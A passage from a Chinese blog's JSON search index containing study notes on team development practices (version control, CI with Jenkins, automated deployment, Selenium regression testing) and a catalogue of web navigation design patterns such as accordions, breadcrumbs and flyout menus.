函数的返回结果类似，是一个数组，第一个元素是整体匹配，后面是每个括号匹配的部分； 注：&#x2F;g 这里的 g 是非必须的，它表示全局替换的意思；如果没有 g，则只替换第一个匹配项；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"高效团队开发","slug":"高效团队开发","date":"2016-11-04T07:10:00.000Z","updated":"2024-09-22T23:08:43.590Z","comments":true,"path":"2016/11/04/高效团队开发/","permalink":"http://example.com/2016/11/04/%E9%AB%98%E6%95%88%E5%9B%A2%E9%98%9F%E5%BC%80%E5%8F%91/","excerpt":"","text":"1. 什么是团队开发待解决的问题 “谁”“到何时为止”做了“什么事情”，“怎样”算做“完成”等； 在团队内部共享代码等各类工作成果； 保证各成员能够利用工作成果并行作业，同时防止工作成果遭到破坏； 在团队中共享从项目中学到的知识； 证明开发出的软件，在任何时间都是可以正常运行的； 构建自动化的工作流程，确保任何人都可以正确的开发、测试和发布； 如何解决问题 版本管理 缺陷管理 持续集成 持续交付 回归测试 2. 团队开发中的问题重要的邮件太多，无法确定处理的优先顺序使用邮件交流问题并不是一个好的方法，因为邮件算不上一种格式化的数据，很难归类整理； 解决方法：使用版本缺陷系统进行问题的管理； 没有能用于验证的环境如果没有用于验证的环境，将导致每次复现 BUG 需要花费很长的时间，导致效率很低； 解决方法：搭建多个环境，分别用于开发、验证、测试、发布等； 用别名目录管理分支用于实现谁、何时、做了什么样的修改； 重新制作数据库比较困难数据库的变更操作也应纳入版本系统进行管理，确保每次的操作内容、顺序在各个环境都是一致的，而不是各个开发环境执行自己的； 不运行系统就无法察觉的问题测试时，需要确保将全员的代码集中到一起运行，以免发生退化； 解决方案：持续集成，每次提交新代码，就合并代码并自动化测试，在第一时间暴露问题； 覆盖了其他组员修正的代码当合并其他成员的代码时，如果出现冲突，有些开发人员可能直接将其他成员的代码进行覆盖，导致出现问题； 解决方案：持续集成； 无法自信的地进行代码重构缺少措施避免出现退化； 解决方案：自动化测试； 不知道 BUG 的修正日期，也不能追踪退化缺少缺陷跟踪系统，导致需要从一堆邮件中查询当时的情况； 解决方案：CI、缺陷跟踪、版本管理三个工具是确保项目高效开发的神器；甚至还应该考虑使用自动化部署； 没有灵活使用分支和标签导致合并的时候容易出现混乱；有时在切换分支修复某些 BUG，切换回新功能分支时，忘了合并刚才的 BUG 分支； 在测试环境、正式环境上无法运行缺少统一管理第三方模块，确保在各个环境的依赖实现一致性的办法； 解决方案： docker； 发布太复杂，以至于需要发布手册涉及如何更新DDL、依赖的库以及配置文件； 解决方案：持续交付； 3. 版本管理系统Git 等分布式版本管理系统 优点 能将代码完整地复制到本地 运行速度快 临时作业的提交易于管理 分支、合并简单方便 可以不受地点的限制进行协作开发 缺点 系统中没有真正意义上的最新版本 没有真正意义上的版本号 工作流程的配置过于灵活，容易产生混乱 有一定的学习成本 需纳入版本管理的内容 代码 需求定义和设计等文档 库的依赖 数据库初始化命令 环境配置文件 标签Git 的每次提交有一个唯一识别码，但是它比较难记，为了让它更具备可识别性，可以为该提交添加标签，通过标签来识别； 虽然分支也可以使用标签，但我发现好像并不是很有必要，貌似直接用分支名就够了； 工作模式中央集权型工作流 Github 型工作流 分支策略模式Git-flow 主分支 master：为发布而建的分支，每次发布时都打上标签 develop：开发用的分支，发布前的最新版本 临时分支 feature：分离自 develop，开发特定功能的分支 release：分离自 develop，为发布做准备的分支，避免混入多余的 feature； hotfix：分离自 master，修复 master 分支的故障；修复后，需要被合并到 master\\develop\\release 三个分支； 有专门的 git-flow 脚本实现以上的管理模式；git-flow 的缺点是有些复杂，需要学习适应一下；同时不支持 GUI 可视化工具； Github-flowgit-flow 的优点是非常清晰可靠，缺点是看上去有点复杂不易理解，因此产生了 github-flow 模式来降低学习成本； Github-flow 流程 master 分支的内容都可以进行发布； 添加内容时，直接从 master 分支新建分支 建立的分支在本地环境上提交，并以同名的分支定期向远程代码库进行 push 开发结束后向 master 分支发送 pull request pull request 在被审核通过后，合并到 master，并从 master 向正式环境发布； Jenkins 可以监控仓库中中的所有分支，这样每个分支 push 到仓库后，都会触发自动构建和测试，确保代码没有问题； 数据库模式和数据的管理问题发生的原因在于如果不同的开发人员，在设置数据库初始化的命令顺序上面，可能存在冲突，导致一些功能无法正常运行； 数据库版本管理的必要条件 在任意环境中，都能使用相同的步骤来构建数据库 能够反复执行多次 格式为文件 数据库迁移基本原理：将数据库初始化需要用的 SQL 命令写入文件，这些文件按数字进行顺序命令，每次启动程序时，按照这些文件进行数据库初始化； 由于是分布式开发，每个开发人员新添加的 SQL 文件可能存在命名冲突，当合并分支时，Git 会报错，此时需要解决冲突，并再次提效修改后的版本；由于修改后的版本是最新版本，因此其他人在合并该版本时，会自动覆盖其本地的版本，因此，仍然能够实现正确的初始化； SQL 文件中的初始化命令是成对出现的，它提供了回滚机制，当出现冲突时，先回滚当前的数据库，再按照最新的版本，重新初始化； 由于冲突是通过手工合并 SQL 命令来解决的，因此不可避免存在错误的可能性，此时就需要通过增加测试代码，来确保万无一失； 配置文件的管理配置文件包括环境变量、密码等信息，这些信息不适合纳入版本管理，因此需要单独上传部署的服务器，此时可以通过编写一个部署脚本，来实现自动上传；而上传的信息，同样可以写在配置文件中，而脚本本身可以纳入版本管理； 常用部署的工具：Chef, Puppet, Capistrano, Fabric, ServerSepc； 依赖关系的管理大多数语言都有自己的依赖管理工具和公共仓库，例如 Java 的 Maven，Node 的 npm，Python 的 Pypi 等； 这些现成的工具的原理： 设置一个中央仓库； 使用一个文件来定义对库的依赖； 执行上述依赖文件的脚本； 4. 任务管理任务管理系统的优点 “有须做什么”的任务定义 “谁来做”的职责分配 “什么时候完成”的期限管理 “作业中或已完成”的状态管理 其他优点 直观性 方便检索 对信息统一管理及共享 能够生成各类报表 能够与其他系统进行关联，具备可扩展性； 任务驱动开发将新功能或者 BUG 任务登记在缺陷管理系统中，每次代码的提交，都与某一个具体的任务单相对应，禁止没有任务单号的提交； 通过设置 Github 的 Webhook，可以实现将 commit 和相应的任务单进行关联； 开发新功能、修改BUG的工作流程 建立任务单 指定责任人 开发 提交：提交的时候，记得标注对应哪个问题单号；这样可以通过问题单，查询到代码修改了哪些内容、什么时候修改的；也可以反向查询，即找到当前代码的修改，对应到哪些问题单，从而知道当时什么要做如此的修改； Push 到代码库 管理对象 epic story task bug 其他Redmine 安装123456789101112131415161718192021222324252627282930version: &#x27;3.7&#x27;services: redmine: image: redmine restart: always ports: - 8080:3000 environment: REDMINE_DB_POSTGRES: db REDMINE_DB_PASSWORD: secret REDMINE_DB_USERNAME: redmine networks: redmine-network: depends_on: - db db: image: postgres restart: always environment: POSTGRES_PASSWORD: secret POSTGRES_USER: redmine networks: redmine-network:networks: redmine-network: Redmine 访问localhost:8080 5. CI 持续集成主要的 CI 工具 Jenkins：插件众多，可配置性强；缺点是上手成本高； Travis：需要配合 Github 使用，优点是上手简单； build 工具以 Java 为例，常用的构建工具有： Maven：适用于新项目； Ant：适用于已开发一半的项目； 测试代码的写法常见的测试类型： 单元测试 集成测试 用户验收测试 回归测试 编写测试代码是要付出时间成本的，理想的情况下当然是覆盖以上所有的测试场景；如果不允许，则应至少包括单元测试和集成测试； 棘手的测试 和外部系统有交互的测试 使用 mock 框架进行测试 使用内存数据进行测试：可避免跟数据库中的数据产生耦合；常用工具如 H2 数据库； UI 相关的测试 Jenkins 使用流程 新建任务：一个任务对应一个项目； 下载代码：将 Github 代码地址与项目进行关联，并设置 Github 的 Webhook，在收到 push 请求后，调用 Jenkins 接口拉取最新的代码； 自动执行 Build 和测试：制作一个构建的脚本，并由 Jenkins 进行调用即可；脚本中需设置退出值，以便 Jenkins 判断任务的执行是失败还是成功； 统计结果并生成报表：使用 JUnitXML 形式输出报表有更好的通用性和直观性，虽然它是 JUnit 设定的格式，但其他语言也有相应的库可以生成该格式的报表； 统计覆盖率：常用的覆盖率统计工具有 Cobertura, Jacoco, Scct, simpleCov, Rcov 等（Cobertura 已于 2011 年停止了开发）； 静态分析：常用工具 Checkstyle, PMD, Findbugs等； 配置通知：对构建结果进行通知，选择常用插件即可，支持邮件、Twitter、IRC、XFD等； 构建失败的惩罚设计一个搞笑的仪式，例如警报灯闪烁、弹射球、戴礼帽等； 当构建发生失败时，基于该构建的分支之后编写的代码，将需要禁止提交，直到构建修复成功为止；为了避免出现这种等待的情况，可考虑使用 Github flow 中的 pull request 流程；当收到 pull request 后会自动进行构建，如果成功，则合并到主分支；如果失败，则不合并； 以上功能在 Jenkins 中需要使用 Github pull request builder 插件实现； 确保可追溯性通过相应的插件，可实现 Jenkins 和 缺陷管理系统的任务单相关，并可以方便的查看每次代码提交的差异； 6. 自动化部署–持续交付由谁负责由想实施部署自动化的人着手去做即可，因此一般来说是运维人员牵头； 前提条件 全部团队成员都采用版本管理； 所有的环境使用相同的方式构建； 实现发布工作的自动化，并事先进行验证 要反复多次进行测试 工具链 引导：服务器 OS 的配置自动化； 配置：服务器及中间件的配置自动化； 业务流程：代码部署及发布的自动化； 引导Kickstart原理：安装 Linux 时，给内核参数加上 ks&#x3D;&lt;…&gt; 选项，即可开启从外部设备加载配置文件，实现安装自动化；背后的本质是将安装过程中的选项，以配置文件的形式提前写好； 仅适用于 RHEL 系统的 Linux 系统，不适用于 Debian 系列； Vagrant用途：用来创建和配置虚拟环境，可以最大化的利用单台机器的性能； 配置应用程序总是运行在一定的进程环境中，复杂的应用程序，可能涉及非常多的环境配置选项，从而带来很大的工作量； Chef根据提前写好的配置规则（cookbooks），让服务器安装软件包和配置中间件，实现自动化； 可以为应用服务器和数据库服务器分别编写 cookbook，这样就能够复制搭建服务器的步骤，实现批量化； Serverspec用途：一个测试框架，可对服务器的配置进行单元测试，确保服务器如预期的正常运行； 最佳实践1：使用虚拟环境 使用 Vagrant 创建干净的虚拟环境；（怀疑之处可考虑结合 docker 来创建虚拟环境）； 拉取 Chef 的 cookbook 和 Serverspec 的测试用例； 执行 Chef，完成服务器的配置； 执行 Serverspec，完成对服务器的状态测试，确保配置成功； 将结果反馈给 jenkins； 以上各个工具都有相应的替代器，因此无须局限于以上工具的使用，重点在于选择最适合团队使用的工具； 最佳实践2：使用物理机Kickstart + Chef + Serverspec 的组合； 与实践1的差别在于将 Vagrant 替换为 Kickstart； 发布自动化Capistrano Capistrano 使用 Push 的方式，无须在应用程序和数据库服务上面安装，只需执行服务器能够通过 SSH 登录前两种服务器即可； Fabric功能同 Capistrano，差别在于使用 Python，而非 Ruby；另外 Fabric 任务可以顺序执行，也可以并行，甚至还可以分组顺序执行，组内则是并行；相当灵活； JenkinsJenkins 同样可以用来实现发布的自动化，不过需要在从节点上安装 Jenkins 才行，还好只需能够 SSH 登录从节点，即可在主节点上远程进行安装； 相对于前面两个工具，Jenkins 的优点在于： 可视化的控制台； 可实现发布任务的权限管理 可查询发布的详细历史记录； 最佳实践组合使用 Jenkins + Fabric，这样既可以利用 Jenkins 的日志功能，又可以获得 Fabric 灵活易用的功能； 手动部署的工具如果可能，尽量所有部署工作设置为自动化；如果出现少数需要手动部署的特例，例如某台机器磁盘空间不足，则有以下工具可以使用： RLogin Tera Term 以上两个工具可以实现一个终端输入，在多台机器上实施相同操作的效果； 当机器数据很多时，有时可能存在少数几台机器的命令执行不成功，此时在执行下一条指令前，应先就上一条指令的结果进行验证，确保无误后，再执行下一条指令； 其他相关问题不中断服务的部署方法蓝绿部署原理：将机器分成两组，先部署其他的一组，成功后，再部署剩下的一组； 缺点：部署过程中会暂停一半的机器资源，会给系统带来比较大的压力，除非增加备用机器，但那样做的成功过高； 云蓝绿部署原理：机器不分组，部署前增加一批新机器进行部署，部署成功后，删除旧机器； 该方法克服了传统蓝绿部署的缺点，但会增加复杂性和出错概率，因为务必要先实现部署的自动化和自动测试； 回滚部署失败不可避免，因此应随时有回滚的机制，包括代码回滚、数据库回滚两种； 回滚时，除了回滚源代码外，还应以服务器的环境进行验证，确保可用；同时还需考虑数据库的迁移； 数据库的回滚分为两种情况，一种是允许新数据的丢弃，一种是不允许；后一种情况比较麻烦，因此，在发布新代码前，应分成两步进行测试，先确保只更新数据库的情况下，旧代码能够顺利进行；之后再进行新代码的发布；此时如果出现问题，也只需回滚代码部分，无须回滚数据库部分； PasS自动化部署需要花费一定的学习和时间成本，因此也有一个选项是考虑使用 PasS 服务；只需 push 代码到相应的平台，即可实现自动化部署； PasS 适用场景 没有足够资源，但希望快速推出产品，收集反馈的项目；（创新项目） 无法预测峰值负荷的服务；（新上线的手机游戏） 生命周期短的服务（例如展会）； 与现有产品进行配合的小项目； PasS 缺点 当流量很大时，费用成本出现不成比例的上升； 有时难以获得想要的日志进行问题分析； 获得的服务等级和合同约定可能不相符； 7. 回归测试回归测试 SeleniumSelenium 并不是单个软件，而是一套工具集； 几个常用的 Selenium 工具Selenium IDE以 Firefox 的插件形式出现，可以录制键盘和鼠标动作，因此对于非技术人员依然非常友好； Selenium Remote Control在测试脚本和浏览器之间，增加了一个服务器作为中间层；由于这个抽象层后，可以使用各种语言编写测试脚本，使得测试更加灵活，例如可以实现循环和分支等； Selenium WebDriver出于安全考虑，主流的浏览器都会对 Javascript 的调用进行限制，WebDriver 的目标即是绕开这些限制，实现调用 OS 的原生接口；在结合 Selenium 后，推出了 Selenium2； 制作测试用例测试由测试用例组成，多个测试用例可以组合一个测试组；测试组内部的用例是顺序执行的；而测试组之间则是并发执行的；好的测试应该能够尽量缩短测试时间，因此，应考虑将测试用例设计成可以并行测试的模式；好的测试组之间不应相互依赖； 由于测试用例的执行是代码级别的速度，而网页的加载则跟网速有关，因此 Selenium的自动化测试会容易出现失败；解决办法在于执行下一条指令前，应对上一条指令的结果进行确认；如果确认失败，应该重复上一条指令；如果确认成功，再开始执行下一条指令； Jenkins 和 Selenium 的协作安装相应的插件，然后配置好相应的参数即可； Selenium 测试的高速化 利用 Jenkins 的分布式机制，设置主从节点，通过启动多个浏览器，实现并发测试； 为每个浏览器客户端匹配相应的应用程序服务器，实现服务端测试的负载均衡（不太理解为什么不使用 nginx 之类的工具来实现，而是改动 hosts 文件） 多个应用程序版本的测试通过 Jenkins 的 Parameterized Trigger plugin”插件，可实现对指定版本进行测试； 使用 Git 拉取相应版本的测试用例时，需要配置插件选项，为每个版本生成相应的目录，避免不同版本的测试用例混在一起； 8. 实践在 Github 上面新建一个项目拉取该项目的代码到本地初始化 package.jsonnpm install 安装依赖简单写一些代码，实现 hello world运行代码，确保顺利写一些单元测试代码写测试脚本设置测试脚本的文件为可执行推送代码到 Github登录生产服务器，新增用户，安装git，拉取代码，安装依赖，运行应用登录 Jenkins 服务器，新增用户，安装 Jenkins，启动 Jenkins配置 jenkins，安装插件，更改密码，新建任务，配置构建脚本；配置 Github 的 Webhooks，以便 push 后触发 Jenkins 的构建；生成 SSH-KEY，将公钥存放到应用程序服务器，开放存放文件夹的访问权限；创建部署文件夹，创建部署的自动化脚本，设置脚本为可执行","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]},{"title":"交互设计模式库","slug":"交互设计模式库","date":"2016-09-25T11:19:00.000Z","updated":"2024-09-22T23:08:41.987Z","comments":true,"path":"2016/09/25/交互设计模式库/","permalink":"http://example.com/2016/09/25/%E4%BA%A4%E4%BA%92%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%BA%93/","excerpt":"","text":"导航 手风琴 问题：用户想通过导航找到某个项目 方案：将多个面板垂直或者水平叠加到一起，展开其中一个面板，缩起其他面板； 场景： 常做为主导航或者次级导航； 本质上类似标签导航；可做为导航树的替代方案； 经常有人在操作向导中使用手风琴，但其实并不合适； 用在FAQ非常合适； 如果设置项目不多的话（少于10个），用来管理设置项也不错； 方式 一次只展开一个面板（如果可以展开多个，则叫做导航树或可关闭面板）； 通过点击面板头部来切换不同的面板； 垂直手风琴展开后，一般展示次级项目；水平手风琴则可以放置大段内容； 几个注意事项 适当的动画效果，以便让用户知道发生了什么事情（动画时间少于250ms） 支持键盘上下方向键； 展开的面板应高亮显示，以便与缩起的面板进行区分； 确保面板尺寸能够根据内容自适应，因为如果高度固定，当内容项很少于，会导致面板很空； 原因 优点：可以将大量元素压缩在有限的空间内进行展示；元素包括：次级项目、问题、属性； 缺点：做为主导航时，大部分元素被隐藏，可见性较弱 其他：垂直式很常见，但动画效果经常做得不好；水平式很少见，但可以带来一些乐趣； 无标题菜单 问题：用户要能到达网站的主要页面 方案：使用垂直菜单栏，通过视觉元素对菜单项进行区隔 场景： 网站的信息架构由2个或者更多的部分组成 每个部分之间相对独立 重要的部分的项目比较多，水平菜单放置不下，需要垂直展示 用户需要优先进行重要的部分 方式 将主要的部分，置于垂直菜单的上部，并从视觉上视觉上强调突出 将次要的部分，置于垂直菜单的下部，视觉上中性展示，不做强调； 原因 主要部分使用垂直菜单，决定了次要部分也只能垂直展示 优点： 通过摆放的位置和视觉对二者进行区分，不需要使用单独的标题； 面包屑 问题：在层级结构中，用户需要知道他所处的位置，以及能够返回上一级 方案：展示出各个级别（从顶级到当前级），并允许对每一级进行点击跳转 场景： 网站有多层级结构（不少于3级）； 中型到大型的网站，如电商、产品目录、入口网站（如网址导航）、企业网站； 配合主导航，主导航允许用户跨越不同分支； 需要一次性回退多个层级，而非逐级回退； 用户不熟悉网站的层级； 方式： 路径显示当前页面所在的层级结构；每一层级使用一个标签，做成可点击的链接； 当面页面的标签要突出标注，并且不可点击（以便让用户知道所处的位置）； 不要用当前页的标签，做为本页面的唯一标题，需要单独再放置一个标题； 层级间使用&#x2F;或&gt;进行区隔； 如果路径很长，中间可以使用活力省略号…隐藏部分内容； 路径单独放置在一块区域中，占据整个内容页面的宽度 放置在靠近内容的区域，建议在内容之下，内容标题之下； 原因 ： 面包屑可以告诉用户所在的位置，并展示出网站的层级，方便用户认知； 占据空间小，能够留更多空间给内容； 使用链接式标签，使用户可以层级间跳跃浏览； 面包屑不做为主导航，需要配合主导航使用； 用户测试显示面包屑很少出现麻烦，总会有部分用户使用，因此可以说有益无害； 案例 创意做法：面包屑结合飞出菜单，用来展示标签下的次级导航； 目录导航 问题：用户想从一个集合中挑选某个项目 方案：将第一级和第二级放置一起显示出来 场景 有好几组项目 用户需要在同一组的项目间进行切换 用户想预览所有项目的全局概况 方式 第一级做为标题，第二级放置在标题下面 每个二级标题右侧，用括号显示内含的项目数量（非必须，尤其是数量很多的时候） 当用户选中某个二级标题时，突出显示（如粗体）；允许用户在同组的标题间进行切换； 当选中某二级标题后，总是有一组二级标题牌被选中的状态； 目的 对全局概览的同时，了解到项目的分类结构； 项目显示为可点击的链接，以便用户可以在同组项目间切换； 地垫导航（感觉类似胖菜单） 问题：用户需要被指引到网站的正确页面 方案：将主要大类及其子项显示在首页中部 场景：信息丰富的网站的首页，如企业网站，信息查询网站 方式： 将内容分为少数的几大类（3-4类最多） 在每一大类下，再显示一组小类（不宜超过8项） 原因 地垫导航允许用户快速预览所有入口； 所有重要信息的展示不容易遗漏； 用户可以通过点击链接快速进入； 双层标签栏 问题：用户需要在多层级的内容间进行浏览 方案：使用双层标签栏显示最高的两个层级 场景 网站内容多，多级结构 每级少于10个项目； 用户需要知道自己的位置 用户需要能快速回首页； 方式 用双层标签栏显示第一级和第二级项目，视觉上要有关联； 当前选中的项目，突出显示； 第一级的项目总是可见，第二级内容仅当父标签选中时才显示； 如果没有回首页的链接，则第一级标签的最左侧位置做为回首页的链接； 原因 标签栏用户非常熟悉，易于使用 通过两级导航，用户知道自己所处的位置，并且可以在项目间跳转； 多维目录 问题：一个事物有多个维度，每个维度都有可能成为用户的查看入口 方案：允许用户递进式的查看事物的多个维度（类似递进筛选） 场景： 用户需要从众多项目中挑选所想要的项目 事物存在多种分类方法，并且没有哪种是习惯性分法； 所有事物需使用相同的分类维度 可以做为高级筛选； 方式 展示出维度，用户可以先选择一种，然后再从余下的选项中，再选择一种； 注意让用户明白，基于选择的结果，选项逐步减少；至少要显示减少的数量，如果能列出结果就更好，以便用户可以点击查看； 变种1：结合面包屑导航，逐步递进，减少搜索结果（面包屑位置列出当前的筛选条件）； 变种2：结合高级搜索（列出各种可设定的搜索条件，减少搜索范围） 原因 不强迫使用单一的分类方式，允许用户按各人习惯查找事物 让用户看到信息结构，这样下次用户可能会尝试不同的搜索办法； 飞出菜单 问题：有两级导航结构，但空间有限 方案：鼠标悬停呼出二级导航 场景 用户有使用经验； 用大标题对项目进行分组，标题无链接； 屏幕空间有限（如果不考虑目录导航的话） 位置固定 点击次数尽量少； 不重新加载页面 方式 悬停飞出 飞出不能挡住其他标题 快速飞出，以可快速切换 建议配合面包屑 可纵向，可横向 常见问题 不易选（面积应够宽够大） 二级再飞出很难选 未暗示可飞出（可加个指标箭头） 隐藏缩起给250ms延迟 水平菜单配合垂直飞出，鼠标移动距离别太小，不然很难选 原因 好处：省空间 坏处：第一眼看不出导航结构；对熟练用户很好用，对一次性用户不友好； 主页链接 问题：用户需要返回起点，或者一个熟悉的安全的页面； 方案：给一个总是可见的元素，可以点击快速回首页 场景：网站一般都有一个首页，当用户在网站内部随意乱逛的时候，可以点击某个链接回到起点&#x2F;首页 方式 用LOGO 用文字“首页” 每页展示，固定位置 原因 让用户可以安全快速的离开当前页面，回到熟悉的地方； LOGO可以做为网站的标识，使其随处可见； 图标 问题：菜单项不多 方案：用图标代表菜单项，在某个固定的位置显示图标标签； 场景： 空间有限； 图标能够有效传达意思； 做法 支持方向键移动焦点；支持鼠标悬停 获得焦点时突出显示图标及其标签（一般位于图标上方或者下方）； 九宫格布置、横向布置、纵向布置； 原因 有效强调图标且布局紧凑；当屏幕空间有限时，效果很好，如手机屏幕； 案例 功能机时代的九宫格 反例：做为产品图标，置于右下角（因为右下角一般视觉优先级较低，图标处于这个位置，容易被误为背景图片） 主导航 问题：每个网站都需要一个主导航，帮助用户使用网站 方案：在页面的固定位置，放置一组总是可见的菜单，并辅以一些导航工具； 场景：所有网站都需要 用法 常见：水平、垂直、倒L三种，及其变种如飞出菜单、无标题菜单 水平： 总是可见、高亮选中；如有二级，放在下方（即双层菜单栏）； 缺点： 只能支持6-8项（取决于宽度、字体、屏宽），如果菜单栏未来会越来越多，则水平会放不下（如果发生，可能需要重组信息分类） 只能支持2-3级；如果层级太多，会占用更多的屏幕纵向空间；如有3级，则需要预留空白位置（内容区域不能顶得太上来） 其他 如有3级，需要特别小心视觉上显示清晰无歧义； 如果有3级以上，一般配合面包屑使用；但此时非常建议考虑使用页面底部的空间，来展示信息架构 优点 占用纵向空间少，使得内容栏可以更宽，尤其是内容拆分多栏（减少单栏宽度），可以增加易读性； 垂直 3种形式： 单级：通常需要配合面包屑或其他方式来展示余下的层级（除非网站够简单） 单级+选中显示二级（也可用飞出） 双级+分组（即无标题菜单） 缺点 如果项目多，当某级展开的时候，部分一级菜单项被挤到下方，需要滚动后才能选到； 如果当前选中项被折叠了，从页面上看不出来当前选中的是什么，思考使用一些其他办法告诉用户所在的位置； 优点 可扩展性强，可以容纳很多很多菜单项 内容区域可以放到页面更高的位置（水平导航则会降低内容区域位置） 页面标题比较容易展示；对于多级的水平导航，在左上角展示当前页面标题，会与选中的导航项重复； 倒L 如果信息有3级以上，则考虑使用倒L；第1级用水平，第2-3用垂直（当然，也可以反过来，但比较少见，因为一般第1级的菜单项较少，而第2-3级的菜单项较多，此时用水平不合适） 如果垂直导航展示的缺点会带来困惑，则可以进一步使用级联页面导航（将导航分成两页，配合面包屑以便用户可以回到上一级） 倒L对于母子网站也很合适（即网站有二级网站）； 不常见：旋转菜单、胖菜单、多维目录、扫雷图 辅助工具：网站地图、网站索引、网页搜索、在线客服、底部复现； 其他：水平导航，菜单项很多时，比如14个，可以考虑分成两行显示（中间还可以插入一些图片） 原因：网站需要使用主导航，让用户快速熟悉网站的信息架构，可以自在高效的浏览 地图导航 问题：用户想在地图上定位地点 方案：在地图上展示用户的兴趣项 场景 网站有可能需要搜索定位特定地点，例如公司网站会提供实体门店的地址； 网站可以让用户随兴搜索兴趣地点，并在地图上展示搜索结果的地点 做法 在地图上列出各个兴趣点； 不同兴趣点使用不同图例来标识； 提供图例的说明； 如果只有一个兴趣点，则展示详细的图例说明 如果有多个兴趣点，则可以使用扫雷模式（当鼠标悬停时显示详细信息）； 用户可能需要打印地图，如有，应提供打印的功能； 原因：我们熟悉使用实体地图，因此使用地图导航用户的认知成本低； 导航工具条 问题：用户想知道他们正在跟谁发生关系 方案：在页面的某个角落区域，放置二级菜单和联系方式； 场景 网站希望与访问者取得联系； 网站很大，需要搜索功能； 导航工具栏需要出现在每一个页面上； 工具栏上的功能项在不同页面可以相应变化 做法 一般由两部分组成： 导航：首页、搜索栏、网站地图、索引、链接； 联系：关于我们、联系方式、反馈（目的是用来向用户介绍组织） 一般放置在网站顶部，因此通常时时可见 原因 导航工具栏显示的功能一般与各页面相关联； 随时可用，显示不唐突，占用较少的屏幕空间； 扫雷导航 问题：需要刺激用户与元素进行交互； 方案：使用图表，当鼠标悬停时展示内容； 场景 用户想搜寻信息，方式有趣很重要； 非富信息网站，侧重视觉效果，或需要呈现某种主题； 吸引用户与元素进行交互并探索可能性，能够带来好处； 做法 元素需易发现，可适当突出显示； 当鼠标悬停时，显示内容，或者改变外观； 当用户点击后，效果类似普通的导航链接； 原因 虽然扫雷模式隐藏了信息，但好处是可能吸引用户进行交互； 对于年轻用户，交互是否有趣很重要 总之：需要谨慎使用此模式 平移缩放 问题：用户想浏览的区域比屏幕面积大； 方案：显示小图预览，然后标注出当前可视的阅读区域 场景： 查看大文档 查看地图或大图片 做法：用户通过拖动可视框或者放大镜来查看和浏览信息； 原因：让用户拥有全局感； 覆盖式菜单 问题：用户需要能找到网站的主导航 方案：将主导航放在用户点击的位置，在用户点击后再出现主导航 场景 网站不复杂，且使用全屏面积来展示内容很重要，需要隐藏主导航，一般来说在艺术类网站比较常见；导航必须很简单，且可发现性不是很重要； 做法： 隐藏主导航，只显示“菜单”字样或者只有图标； 当用户点击图标时，在点击处展现出主导航； 原因 导航不可见且位置不固定，确实容易产生困惑，尤其是信息类网站不适合使用此模式； 所幸网站存在主导航，且能够在需要的地方展现出来； 此模式是非常规做法，有些场景会特别适合，总之，需要谨慎使用； 双重导航 问题：让用户找到主导航 方案：主导航重复出现，例如置于底部 场景 此模式常配合底部水平菜单使用，很多网站内容较长，需要向下滚动以便查看整个页面；当用户向下滚动条，底部导航会不在视线内，此时如果底部再展示一次导航，可以使用用户操作（由于用户已经见过一次主导航，所以可以很容易认知底部导航的用法） 做法：可以设置一个导航条，内容与主导航相同，只是尺寸更小，使用文字链接； 原因：让用户想使用导航时，不必回到页面顶部；弱化的颜色和更小的字体，让用户明白这是一个辅助项，以示跟主导航区分； 抽屉导航 问题：用户需要使用导航，但也需要更大的屏幕空间； 方案：让导航可以缩起，也可以拉出； 场景： 屏幕空间有限，且主导航占用较大的面积； 替代方案：使用足迹导航+飞出菜单 做法：使用H5实现动画效果，以及自适应的布局； 原因： 节省屏幕空间的同时，仍然使用得导航可用； 与飞出菜单和叠加菜单不同，抽屉导航展示后，需要固定显示在屏幕上，不会自动隐藏； 旋转菜单 问题：用户需要在一组图片中挑选一张 方案：将图片做一个旋转菜单 场景 用户想寻找某张特定图片，并且用户凭缩略图即能够快速识别所需图片，因为屏幕空间及加载性能限制，不适宜展示大图； 图片大约有5-25张，数量控制在一次可显示的数量的3倍，因为再多就不便查找了； 用户花费尽可能少的操作即可找到所需图片； 用户需要能够找到所需图片； 用户能够快速的到达开头或结尾； 做法 菜单的中间做为选择区域； 当鼠标离开中间位置，菜单开始滚动；鼠标偏离中心位置越远，滚动越快； 左右两侧旋转箭头，以便用户可以知道能够滚动； 当鼠标回到中心位置，并选择某张图片时，高亮选中； 选中后，显示大图，旋转菜单仍保持在原位置； 当页面加载后，旋转菜单即开始自动旋转，保持恒定速度不变，直至鼠标进入旋转菜单区域； 询问增加滚动条暗示总体位置； 也可竖向展示 原因 适用于屏幕空间有限无法展示所有大图的场景；通过旋转菜单一次可以展示多张图片； 旋转的动画效果可以减少用户的操作路径，但有可能给部分用户造成选择困难； 会给部分用户带来一定的操作乐趣； 快捷方式菜单 问题：用户想直接进入某个功能； 方案：设置一个快速方式下拉菜单供用户选择； 场景 网站有基本的导航，但网站有几个页面会被用户频繁访问； 除了使用频繁外，它们之间并无太多关联； 这些功能点由于逻辑划分，可能处于2-3级菜单中，但却需要被快速简单的访问； 做法：在页面某个固定的位置放置一个快捷盒子，里面放上常用链接，用户可以通过这些链接快速到达所需地点； 原因：普通导航是面向全局网站的，但有少数功能由于访问频繁，需要能够让用户最快捷的到达； 分页菜单 问题：用户需要漫游在层级结构中 方案：将层级菜单分开在两个单独的页面； 场景 有4级以上导航，内容处于第2-3级； 分体菜单有点类似目录菜单； 在第3-4级菜单间切换很重要，基本不在1-2间菜单，第1级菜单无内容 做法 将菜单分为启动页和主题页；启动页包含1-2级菜单；主题页包含3-4级菜单； 所有文字内容显示在主题页面中； 用户通过索引链接在3-4级页面间切换； 通过面包屑导航告知用户位置，并使得用户能够返回上一级； 原因 通过双页导航，用户选择后，第一级菜单不再出现； 结果是用户能够流畅的在第3级菜单间浏览 同时通过面包屑返回上一级； 显示更多 问题：用户需要点击链接 方案：让部分菜单项可以展示 场景：菜单项很多，已有主导航，但仍然不够，需要显示更多的菜单项 做法：设置某个选项，用户点击可以查看更多，在当前页显示，或者新页面显示； 原因：不展示所有选项，但用户仍然可以有入口可以查看更多的选项，节省屏幕空间； 